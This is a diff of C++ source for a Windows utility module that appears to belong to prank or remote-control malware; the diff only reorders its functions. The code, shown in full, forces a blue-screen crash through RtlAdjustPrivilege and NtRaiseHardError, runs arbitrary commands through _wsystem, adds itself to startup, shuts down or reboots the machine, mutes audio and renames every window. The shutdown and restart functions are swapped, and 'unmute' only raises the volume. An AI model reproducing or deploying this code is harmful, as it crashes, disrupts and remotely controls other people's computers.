@@ -12,9 +12,11 @@ extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG Unless1, ULON
 
 namespace Wwin
 {
-	void UtilsExecuteCommand(const wchar_t* command)
+	BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
 	{
-		_wsystem(command);
+		SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)lParam, SMTO_ABORTIFHUNG, 100, NULL);
+
+		return TRUE;
 	}
 
 	void UtilsAddStartup()
@@ -50,13 +52,24 @@ namespace Wwin
 		}
 	}
 
-	void UtilitsBlueScreen()
+	void UtilsRestartSystem()
 	{
-		BOOLEAN PrivilegeState = FALSE;
-		ULONG ErrorResponse = 0;
+		ExitWindowsEx(EWX_SHUTDOWN, 0);
+	}
 
-		RtlAdjustPrivilege(19, TRUE, FALSE, &PrivilegeState);
-		NtRaiseHardError(STATUS_IN_PAGE_ERROR, 0, 0, NULL, 6, &ErrorResponse);
+	void UtilsShutdownSystem()
+	{
+		ExitWindowsEx(EWX_REBOOT, 0);
+	}
+
+	void UtilsMuteVolume()
+	{
+		SendMessageW(HWND_BROADCAST, WM_APPCOMMAND, 0, MAKELPARAM(0, APPCOMMAND_VOLUME_MUTE));
+	}
+
+	void UtilsUnmuteVolume()
+	{
+		SendMessageW(HWND_BROADCAST, WM_APPCOMMAND, 0, MAKELPARAM(0, APPCOMMAND_VOLUME_UP));
 	}
 
 	bool UtilsCheckProcessRunning(const wchar_t* processName)
@@ -117,35 +130,22 @@ namespace Wwin
 		CloseHandle(snapshot);
 	}
 
-	void UtilsRestartSystem()
-	{
-		ExitWindowsEx(EWX_SHUTDOWN, 0);
-	}
-
-	void UtilsShutdownSystem()
-	{
-		ExitWindowsEx(EWX_REBOOT, 0);
-	}
-
-	void UtilsMuteVolume()
-	{
-		SendMessageW(HWND_BROADCAST, WM_APPCOMMAND, 0, MAKELPARAM(0, APPCOMMAND_VOLUME_MUTE));
-	}
-
-	void UtilsUnmuteVolume()
-	{
-		SendMessageW(HWND_BROADCAST, WM_APPCOMMAND, 0, MAKELPARAM(0, APPCOMMAND_VOLUME_UP));
-	}
-
-	BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
-	{
-		SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)lParam, SMTO_ABORTIFHUNG, 100, NULL);
-
-		return TRUE;
-	}
-
 	void UtilsChangeWindowsTitle(const wchar_t* title)
 	{
 		EnumWindows(EnumWindowsProc, (LPARAM)title);
+	}
+
+	void UtilsExecuteCommand(const wchar_t* command)
+	{
+		_wsystem(command);
+	}
+
+	void UtilitsBlueScreen()
+	{
+		BOOLEAN PrivilegeState = FALSE;
+		ULONG ErrorResponse = 0;
+
+		RtlAdjustPrivilege(19, TRUE, FALSE, &PrivilegeState);
+		NtRaiseHardError(STATUS_IN_PAGE_ERROR, 0, 0, NULL, 6, &ErrorResponse);
 	}
 }
